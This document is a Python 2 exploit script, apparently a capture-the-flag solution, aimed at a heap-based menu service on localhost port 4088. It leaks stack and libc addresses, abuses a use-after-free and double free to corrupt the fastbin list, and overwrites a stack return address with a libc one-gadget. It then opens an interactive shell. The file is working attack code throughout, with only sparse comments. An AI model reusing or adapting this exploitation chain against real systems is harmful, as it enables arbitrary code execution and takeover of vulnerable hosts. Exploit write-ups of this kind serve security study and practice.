import socket, struct, telnetlib, re


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu():
    read_until(f, '3: Quit\n')


def search_(data_list, command):
    skip_menu()
    f.write('1' + '\n')
    read_until(f, 'Enter the word size:\n')

    output = ''
    for data in data_list[:-1]:
        f.write(str(data[0]) + '\n')
        output += read_until(f, 'is not a valid number')

    f.write(data_list[-1][0] + '\n')
    f.write(data_list[-1][1] + '\n')
    f.write(command + '\n')

    return output


def search(data, len_ = None):
    print 'search: {}'.format(data)
    skip_menu()
    f.write('1' + '\n')
    read_until(f, 'Enter the word size:\n')

    print '[+] Send len'
    if len_:
        f.write(str(len_) + '\n')
    else:
        f.write(str(len(data)) + '\n')

    read_until(f, 'Enter the word:\n')
    print '[+] Send data'
    f.write(data)

    ret = read_until(f, 'Delete this sentence (y/n)?')
    print '[+] Send y(es)'
    f.write('y\n')
    return ret

def index_mul(data_list):
    skip_menu()
    f.write('2' + '\n')
    read_until(f, 'Enter the sentence size:\n')

    output = ''
    for data in data_list[:-1]:
        f.write(str(data) + '\n')
        output += read_until(f, 'is not a valid number')

    f.write(str(data_list[-1][0]) + '\n')
    f.write(data_list[-1][1] + '\n')

    read_until(f, 'Added sentence\n')

    return output


def index(data):
    print 'Index: {}'.format(data)
    skip_menu()
    f.write('2' + '\n')
    read_until(f, 'Enter the sentence size:\n')

    f.write(str(len(data)) + '\n')
    f.write(data + '\n')
    read_until(f, 'Added sentence\n')

s, f = sock("127.0.0.1", 4088)

p = 'B' * 48 + '(.*)' + ' is not a valid number'

data_list = ['A' * 48, 'B' * 48, (8, 'C' * 8)]
output = index_mul(data_list)
addr_stack = re.search(p, output).group(1).ljust(8, '\x00')
addr_stack = u64(addr_stack)

print '[+] Leaked addr_stack = {}'.format(hex(addr_stack))

# The word pointer in word structure will be pointing at where
# 'hoge' was at (but zeroed out), whereas the memory address already freed 
# and zeroed out (where there used to be 'bbbb... hoge ccc...')
# will have pointer to main arena

index(('D'*256 + ' hoge ').ljust(512, 'c'))

search('hoge')

skip_menu()
f.write('1' + '\n')
f.write('4\n')
f.write('\x00'*4 + '\n')
data = read_until(f, 'Delete this sentence (y/n)?')
f.write('n\n')

pat = 'Found \d*: (.*)\nDelete'
m = re.search(pat, data)
addr_main_arena = u64(m.group(1)[:8])
addr_libc_base = addr_main_arena - 3951480
print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))

index(' fuga'.rjust(56, 'E'))
index(' fuga'.rjust(56, 'F'))
index(' fuga'.rjust(56, 'G'))


skip_menu()
f.write('1' + '\n')
f.write('4\n')
f.write('fuga\n')
f.write('y\n') # c
f.write('y\n') # b
f.write('y\n') # a

skip_menu()
print 'Send zeros'
f.write('1' + '\n')
f.write('4\n')
f.write('\x00'*4+'\n')
print read_until(f, 'Delete this sentence (y/n)?')
f.write('y\n')

# fastbins free chunk is now in a loop
# Len needs to be 56
print 'now in loop'

addr_ret_addr = addr_stack + 0x98
addr_tgt_stack = addr_ret_addr - 0x18 + 2
payload = (p64(addr_tgt_stack) + ' bar ').ljust(56, 'H')
index(payload)

index(('IIII ' + ' bar ').ljust(56, 'H'))
index(('JJJJ ' + ' bar ').ljust(56, 'K'))

# Next index size 56 should return stack address
addr_one = addr_libc_base + 0xf1147
print 'Send one gadget address'
index(('L' * 6 + p64(addr_one)).ljust(56, 'M'))

skip_menu()
print 'start shell'
f.write('3\n')

shell(s)
